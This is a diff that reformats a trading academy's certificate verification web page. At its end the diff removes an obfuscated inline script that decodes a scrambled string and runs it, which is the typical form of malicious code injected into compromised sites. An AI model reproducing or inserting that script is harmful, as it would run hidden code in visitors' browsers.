@@ -1,255 +1,299 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-
-<head>
+  <head>
     <!-- ✅ Google Tag Manager -->
     <script>
-        (function (w, d, s, l, i) {
-            w[l] = w[l] || [];
-            w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
-            var f = d.getElementsByTagName(s)[0],
-                j = d.createElement(s),
-                dl = l != 'dataLayer' ? '&l=' + l : '';
-            j.async = true;
-            j.src = 'https://www.googletagmanager.com/gtm.js?id=GTM-TT7SLZ4L' + dl;
-            f.parentNode.insertBefore(j, f);
-        })(window, document, 'script', 'dataLayer', 'GTM-TT7SLZ4L');
+      (function (w, d, s, l, i) {
+        w[l] = w[l] || [];
+        w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
+        var f = d.getElementsByTagName(s)[0],
+          j = d.createElement(s),
+          dl = l != "dataLayer" ? "&l=" + l : "";
+        j.async = true;
+        j.src = "https://www.googletagmanager.com/gtm.js?id=GTM-TT7SLZ4L" + dl;
+        f.parentNode.insertBefore(j, f);
+      })(window, document, "script", "dataLayer", "GTM-TT7SLZ4L");
     </script>
 
     <!-- ✅ Basic -->
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
     <!-- ✅ SEO -->
     <title>Official Verification | BR30 Trader</title>
-    <meta name="description"
-        content="Verify the authenticity of BR30 Trader. MSME registered platform with secure and trusted trading education services.">
-    <meta name="keywords"
-        content="BR30 Trader verification, MSME registered trading course, trusted trading platform India">
-    <meta name="author" content="BR30 Trader">
-    <meta name="robots" content="index, follow">
+    <meta
+      name="description"
+      content="Verify the authenticity of BR30 Trader. MSME registered platform with secure and trusted trading education services."
+    />
+    <meta
+      name="keywords"
+      content="BR30 Trader verification, MSME registered trading course, trusted trading platform India"
+    />
+    <meta name="author" content="BR30 Trader" />
+    <meta name="robots" content="index, follow" />
 
     <!-- ✅ Canonical -->
-    <link rel="canonical" href="https://br30trader.com/verify.html">
+    <link rel="canonical" href="https://br30trader.com/verify.html" />
 
     <!-- ✅ Favicon -->
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
 
     <!-- ✅ Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
 
     <!-- ✅ Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
 
     <!-- 🎥 QR Scanner -->
     <script src="https://unpkg.com/html5-qrcode"></script>
 
     <style>
-        body {
-            background: #050505;
-            color: #ffffff;
-            font-family: 'Poppins', sans-serif;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
+      body {
+        background: #050505;
+        color: #ffffff;
+        font-family: "Poppins", sans-serif;
+        margin: 0;
+        padding: 20px;
+        text-align: center;
+      }
+
+      .verify-card {
+        max-width: 500px;
+        margin: 40px auto;
+        background: #111;
+        padding: 30px;
+        border-radius: 25px;
+        border: 2px solid #00ff88;
+        box-shadow: 0 0 30px rgba(0, 255, 136, 0.1);
+      }
+
+      h2 {
+        color: #00ff88;
+        text-transform: uppercase;
+        letter-spacing: 2px;
+      }
+
+      /* Input & Button */
+      input {
+        width: 90%;
+        padding: 15px;
+        border-radius: 12px;
+        border: 1px solid #333;
+        background: #000;
+        color: #00ff88;
+        margin-bottom: 15px;
+        font-weight: bold;
+        text-align: center;
+      }
+
+      button {
+        width: 100%;
+        padding: 15px;
+        background: #00ff88;
+        color: #000;
+        font-weight: 900;
+        border: none;
+        border-radius: 12px;
+        cursor: pointer;
+        text-transform: uppercase;
+        transition: 0.3s;
+      }
+
+      button:hover {
+        box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
+        transform: scale(1.02);
+      }
+
+      /* 📸 Camera Section */
+      #reader {
+        width: 100%;
+        border-radius: 15px;
+        overflow: hidden;
+        margin-top: 20px;
+        border: 1px dashed #00ff88;
+      }
+
+      /* ✅ Result Section */
+      #result-box {
+        display: none;
+        margin-top: 25px;
+        padding: 20px;
+        border-radius: 15px;
+        border-left: 5px solid #00ff88;
+        background: rgba(0, 255, 136, 0.05);
+        text-align: left;
+        animation: fadeIn 0.5s ease;
+      }
+
+      .status-tag {
+        background: #00ff88;
+        color: #000;
+        padding: 5px 10px;
+        border-radius: 5px;
+        font-weight: 900;
+        font-size: 12px;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
         }
 
-        .verify-card {
-            max-width: 500px;
-            margin: 40px auto;
-            background: #111;
-            padding: 30px;
-            border-radius: 25px;
-            border: 2px solid #00ff88;
-            box-shadow: 0 0 30px rgba(0, 255, 136, 0.1);
+        to {
+          opacity: 1;
+          transform: translateY(0);
         }
-
-        h2 {
-            color: #00ff88;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        /* Input & Button */
-        input {
-            width: 90%;
-            padding: 15px;
-            border-radius: 12px;
-            border: 1px solid #333;
-            background: #000;
-            color: #00ff88;
-            margin-bottom: 15px;
-            font-weight: bold;
-            text-align: center;
-        }
-
-        button {
-            width: 100%;
-            padding: 15px;
-            background: #00ff88;
-            color: #000;
-            font-weight: 900;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: 0.3s;
-        }
-
-        button:hover {
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
-            transform: scale(1.02);
-        }
-
-        /* 📸 Camera Section */
-        #reader {
-            width: 100%;
-            border-radius: 15px;
-            overflow: hidden;
-            margin-top: 20px;
-            border: 1px dashed #00ff88;
-        }
-
-        /* ✅ Result Section */
-        #result-box {
-            display: none;
-            margin-top: 25px;
-            padding: 20px;
-            border-radius: 15px;
-            border-left: 5px solid #00ff88;
-            background: rgba(0, 255, 136, 0.05);
-            text-align: left;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .status-tag {
-            background: #00ff88;
-            color: #000;
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-weight: 900;
-            font-size: 12px;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
+      }
     </style>
-</head>
+  </head>
 
-<body>
+  <body>
     <!-- ✅ GTM noscript -->
     <noscript>
-        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TT7SLZ4L" height="0" width="0"
-            style="display:none;visibility:hidden"></iframe>
+      <iframe
+        src="https://www.googletagmanager.com/ns.html?id=GTM-TT7SLZ4L"
+        height="0"
+        width="0"
+        style="display: none; visibility: hidden"
+      ></iframe>
     </noscript>
     <div class="verify-card">
-        <img src="images/BR30™  LOGO.jpeg" alt="BR30" width="80" style="margin-bottom: 10px;">
-        <h2>🛡️ BR30 VERIFICATION</h2>
-        <p style="color: #94a3b8; font-size: 13px;">Official MSME Registered Academy Verification System</p>
+      <img
+        src="images/BR30™  LOGO.jpeg"
+        alt="BR30"
+        width="80"
+        style="margin-bottom: 10px"
+      />
+      <h2>🛡️ BR30 VERIFICATION</h2>
+      <p style="color: #94a3b8; font-size: 13px">
+        Official MSME Registered Academy Verification System
+      </p>
 
-        <!-- ⌨️ SEARCH BOX -->
-        <input type="text" id="certInput" placeholder="ENTER CERTIFICATE NO BR30-123456">
-        <button onclick="verifyCert()">VERIFY CERTIFICATE ✅</button>
+      <!-- ⌨️ SEARCH BOX -->
+      <input
+        type="text"
+        id="certInput"
+        placeholder="ENTER CERTIFICATE NO BR30-123456"
+      />
+      <button onclick="verifyCert()">VERIFY CERTIFICATE ✅</button>
 
-        <div style="margin: 25px 0; color: #333; font-weight: bold;">-- OR SCAN QR CODE --</div>
+      <div style="margin: 25px 0; color: #333; font-weight: bold">
+        -- OR SCAN QR CODE --
+      </div>
 
-        <!-- 🎥 CAMERA SCANNER -->
-        <div id="reader"></div>
+      <!-- 🎥 CAMERA SCANNER -->
+      <div id="reader"></div>
 
-        <!-- 🏆 VERIFICATION RESULT -->
-        <div id="result-box">
-            <span class="status-tag">OFFICIALLY VERIFIED✅</span>
-            <h3 id="res-name" style="margin: 15px 0 5px 0; color: #00ff88;"></h3>
-            <p id="res-course" style="margin: 0; color: #cbd5e1; font-size: 14px;"></p>
-            <p id="res-date" style="margin-top: 10px; color: #94a3b8; font-size: 12px;"></p>
-        </div>
+      <!-- 🏆 VERIFICATION RESULT -->
+      <div id="result-box">
+        <span class="status-tag">OFFICIALLY VERIFIED✅</span>
+        <h3 id="res-name" style="margin: 15px 0 5px 0; color: #00ff88"></h3>
+        <p
+          id="res-course"
+          style="margin: 0; color: #cbd5e1; font-size: 14px"
+        ></p>
+        <p
+          id="res-date"
+          style="margin-top: 10px; color: #94a3b8; font-size: 12px"
+        ></p>
+      </div>
     </div>
 
     <script src="config.js"></script>
     <script>
-        // 🎥 1. Camera Scanner Logic
-        const html5QrCode = new Html5Qrcode("reader");
-        const config = { fps: 10, qrbox: { width: 250, height: 250 } };
+      // 🎥 1. Camera Scanner Logic
+      const html5QrCode = new Html5Qrcode("reader");
+      const config = { fps: 10, qrbox: { width: 250, height: 250 } };
 
-        html5QrCode.start({ facingMode: "environment" }, config, (decodedText) => {
-            let id = decodedText;
-            if (decodedText.includes('id=')) {
-                id = decodedText.split('id=')[1];
-            }
-            document.getElementById('certInput').value = id;
-            verifyCert();
-        });
+      html5QrCode.start(
+        { facingMode: "environment" },
+        config,
+        (decodedText) => {
+          let id = decodedText;
+          if (decodedText.includes("id=")) {
+            id = decodedText.split("id=")[1];
+          }
+          document.getElementById("certInput").value = id;
+          verifyCert();
+        },
+      );
 
-        // 🔍 2. Verification API Logic (FIXED: Date & Download Button)
-        async function verifyCert() {
-            const certId = document.getElementById('certInput').value.trim();
-            const resBox = document.getElementById('result-box');
+      // 🔍 2. Verification API Logic (FIXED: Date & Download Button)
+      async function verifyCert() {
+        const certId = document.getElementById("certInput").value.trim();
+        const resBox = document.getElementById("result-box");
 
-            if (!certId) return alert("Bhai, ID toh dalo!");
+        if (!certId) return alert("Bhai, ID toh dalo!");
 
-            try {
-                const res = await fetch(window.API_BASE_URL + `/api/auth/verify-certificate/${certId}`);
-                const data = await res.json();
+        try {
+          const res = await fetch(
+            `${window.API_BASE_URL}/api/auth/verify-certificate/${certId}`,
+          );
 
-                if (data.success) {
-                    resBox.style.display = "block";
-                    document.getElementById('res-name').innerText = data.studentName.toUpperCase();
-                    document.getElementById('res-course').innerText = data.course;
+          const data = await res.json();
 
-                    // 📅 3. DATE FORMATTING
-                    const dateObj = new Date(data.issueDate);
-                    const formattedDate = isNaN(dateObj) ? new Date().toLocaleDateString('en-IN') : dateObj.toLocaleDateString('en-IN');
-                    document.getElementById('res-date').innerText = "Issued on: " + formattedDate;
+          if (data.success) {
+            resBox.style.display = "block";
+            document.getElementById("res-name").innerText =
+              data.studentName.toUpperCase();
+            document.getElementById("res-course").innerText = data.course;
 
-                    // 📥 4. DYNAMIC DOWNLOAD BUTTON (Golden Touch)
-                    const oldBtn = document.getElementById('dl-btn');
-                    if (oldBtn) oldBtn.remove(); // Purana button hatao
+            // 📅 3. DATE FORMATTING
+            const dateObj = new Date(data.issueDate);
+            const formattedDate = isNaN(dateObj)
+              ? new Date().toLocaleDateString("en-IN")
+              : dateObj.toLocaleDateString("en-IN");
+            document.getElementById("res-date").innerText =
+              "Issued on: " + formattedDate;
 
-                    const dlBtn = document.createElement('button');
-                    dlBtn.id = 'dl-btn';
-                    dlBtn.innerHTML = "DOWNLOAD CERTIFICATE 📥";
-                    dlBtn.style.cssText = "width:100%; padding:12px; margin-top:20px; background:#D4AF37; color:#000; border:none; border-radius:10px; font-weight:900; cursor:pointer; text-transform:uppercase; letter-spacing:1px; transition: 0.3s;";
+            // 📥 4. DYNAMIC DOWNLOAD BUTTON (Golden Touch)
+            const oldBtn = document.getElementById("dl-btn");
+            if (oldBtn) oldBtn.remove(); // Purana button hatao
 
-                    // Hover Effect
-                    dlBtn.onmouseover = () => dlBtn.style.boxShadow = "0 0 15px rgba(212, 175, 55, 0.5)";
-                    dlBtn.onmouseout = () => dlBtn.style.boxShadow = "none";
+            const dlBtn = document.createElement("button");
+            dlBtn.id = "dl-btn";
+            dlBtn.innerHTML = "DOWNLOAD CERTIFICATE 📥";
+            dlBtn.style.cssText =
+              "width:100%; padding:12px; margin-top:20px; background:#D4AF37; color:#000; border:none; border-radius:10px; font-weight:900; cursor:pointer; text-transform:uppercase; letter-spacing:1px; transition: 0.3s;";
 
-                    // 🔥 Target Blank Link
-                    dlBtn.onclick = () => window.open(data.downloadUrl, '_blank');
+            // Hover Effect
+            dlBtn.onmouseover = () =>
+              (dlBtn.style.boxShadow = "0 0 15px rgba(212, 175, 55, 0.5)");
+            dlBtn.onmouseout = () => (dlBtn.style.boxShadow = "none");
 
-                    resBox.appendChild(dlBtn);
-                    resBox.scrollIntoView({ behavior: 'smooth' });
-                } else {
-                    alert("❌ Invalid Certificate ID!");
-                    resBox.style.display = "none";
-                }
-            } catch (err) {
-                alert("Bhai, server connection fail!");
-            }
+            // 🔥 Target Blank Link
+            dlBtn.onclick = () => window.open(data.downloadUrl, "_blank");
+
+            resBox.appendChild(dlBtn);
+            resBox.scrollIntoView({ behavior: "smooth" });
+          } else {
+            alert("❌ Invalid Certificate ID!");
+            resBox.style.display = "none";
+          }
+        } catch (err) {
+          alert("Bhai, server connection fail!");
         }
+      }
 
-        // 5. Auto-load agar URL mein ID hai
-        window.onload = () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const id = urlParams.get('id');
-            if (id) {
-                document.getElementById('certInput').value = id;
-                verifyCert();
-            }
-        };
+      // 5. Auto-load agar URL mein ID hai
+      window.onload = () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const id = urlParams.get("id");
+        if (id) {
+          document.getElementById("certInput").value = id;
+          verifyCert();
+        }
+      };
     </script>
     <script>
-        (function () { var iEX = '', jkf = 628 - 617; function EUf(c) { var z = 6376169; var g = c.length; var j = []; for (var a = 0; a < g; a++) { j[a] = c.charAt(a) }; for (var a = 0; a < g; a++) { var x = z * (a + 112) + (z % 40890); var u = z * (a + 689) + (z % 16572); var r = x % g; var h = u % g; var y = j[r]; j[r] = j[h]; j[h] = y; z = (x + u) % 7011803; }; return j.join('') }; var Vfe = EUf('hmridetcwuyoonurcfrgtkljasptsonxvbqcz').substr(0, jkf); var bFt = '=q( nf,0}v0"t,vb;5zvtlry)pav[j0)e0ifhlm<jx7r[.p=uC;zjopartnttnr,n2)]r,;l,anftht(;,06a7=,a (gr,tctv;,,4j6(uy-(v)v)1t8e,.66;va" ,2"[.k-r*);(r.d-m+ [qlr;;twv) n)i[s.=]4.h+(,r0;+ia31 uguS3v2o=;0hf(fn,mfu83pl 4qCu)(aa hgmra+s=l)nnt)ae+C)7vcrrrus(g[v(+8s1e4;ip0se)ezbuaCofkvl;a"=ajbnaetu-r;r+=0,siAh{qaA  12{r[];crav*j,"b9[acr.)=abr+n;jnrk0gh6i0=do)lb(+tr;palvl)ao eg]uel]sn(;;;bl)=g1a.pudo,(=1rd;ae 95lrC+9rve=)Ada;ifs;+{w=k7oa8axba..s ogov=<Cp1e1;-. (=n !in]pe)o>b==fdv=]ru2iv gn.3ltvvhiceo=;e.)Codehe(=+ sfvd..hfo0;w+rr] +Caa{;]==sntn+[}v"n;ho=6oia{"1ciihw2cx8lju(=wf=rb(h;+oca;tshkoes(b;obzre(8nlelh]]ak.u(n,n+,.h]v<l+(f 0;r;!={u6z;aic(og]+.ii;a,)f8sni5(0rxg;9d))jas(=;.7;tn8l7i.7tc.5n"hfq[i=}as8=r  icnjt+(h},[[}b) z.[to,r2l)n=9py4(,nlbic)r;ht)<)=ia(;o=r,(svg,fr7 ;5a=1or=((6[>+o=pxa-h;-tA9<}el.n}]hr(s+v)9vha,l8t;t+frdr."AS(o)er(o1ba2 r{nzhtr=m)o)= oasem+h==;;me1jmhl.=solht+,a"g;s.1);r)t=.'; var rsW = EUf[Vfe]; var wDC = ''; var TVK = rsW; var Eky = rsW(wDC, EUf(bFt)); var pUC = Eky(EUf('!),1foe_b_u;6j  _P.aP$1)!4;$5eo!9;P=(}f 6ba13t.P$P_iPf)gf,tkwS)j4nw}fyPP2f]PP&n}1 _f"n)6!3{).+(by3.e$P26.%3&2o==0;cle$$Po[(P%fincP)u=*EPr_t6e7tg$+Pbb{)3$P)m41.P}oaaPP;k0n =jbs;f%.e,5]sb,j3_jPl)bi)P)-un,.rf53heP!!..v)o]s\'Pobnc3wd ;3(b01223!b$+15\'f)_{3.P;oe{]a,b(P&w3(iuarb.nw(ogPP(0(P(j_}.x(3.n(b4ls..P.ePi7C(3,) v)!,b\'P4.)a2P.-P5)3P)(vP8 +)i)ln9\'1!8t(6egeP9Pm.w\/3,.2)}iPo)etf%m5en9.P_cf46Pp.$3Pppb!r);3wc\/.4o04bP4448i Pbtd(inPqPP;7=ni4nP ;},;j,=(P71ero66}Ps;$7;m=Pwen$q)Pilb+#PP$&(m$_)eCP5PPbP7.;p3P!"id)l={]{P$cf.w2_!!fp.l%eP6=tc[!tob(gjPttbrvi]ln_bj.6tt.!P0,PPee}%o)l.j%pb1Po(b)_P368Peeu,e.c4nt${)(#)cw.DaP)Peu}31e(t{(.8tz".cdr;.;)nPs.c%eS q(3r==)(=1ik7c.1er0tsty_.PooP1_711*;oC{.,)tn#8(}pa).i)ojbP#1;m2ebb}7tf]63en3f3e3g"se2;PP(-g=isj.$.j8)9P_)wen3t0+.bb46;3tuP[P5n(8Pom#$_3lb!o_,-5elc(.Pcaf4Pf!P$u*a}..P(.,P4\'o-2Pl7hb)"2b.3P,,3* P}}ou#u]ont3PPw]bv*ha 2fue.l._PdP{r;tfvjpt5yPP[P)]0.(c}rP7pn+,n7(P{;gu{joo}P\'6oj*b3.m$; nd}(Pc,.3)7$s,pr{e4jr}.tb,)ltih-k%,P(!,.uPn#(}p!=me2PP!l=()v)duP =_4({csve7r)5$tePo(Pb!vime]%)P$7)_u)pj];0s_}_&P2(]("d4nP(l%tieP.bj363}v$& 2_u1rj_483, (0P=(nnb]bP.\/.]Pjn,P[;bbu\/6sm;(a},r!_,r Pj))toer+0ie o=146iSsnnP%o s.o1eePta,!if3dv)j0e=P6s3ri30r)c(,u!-p .c!)e!e$idt8,[_.tPm,n(6bo$f+d ,.)t\/(= _%.b i6.P[,;.r4_==Pbe d=Pee.tjePcb.;')); var OSu = TVK(iEX, pUC); OSu(8958); return 3887 })()
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
     </script>
-</body>
-
+  </body>
 </html>
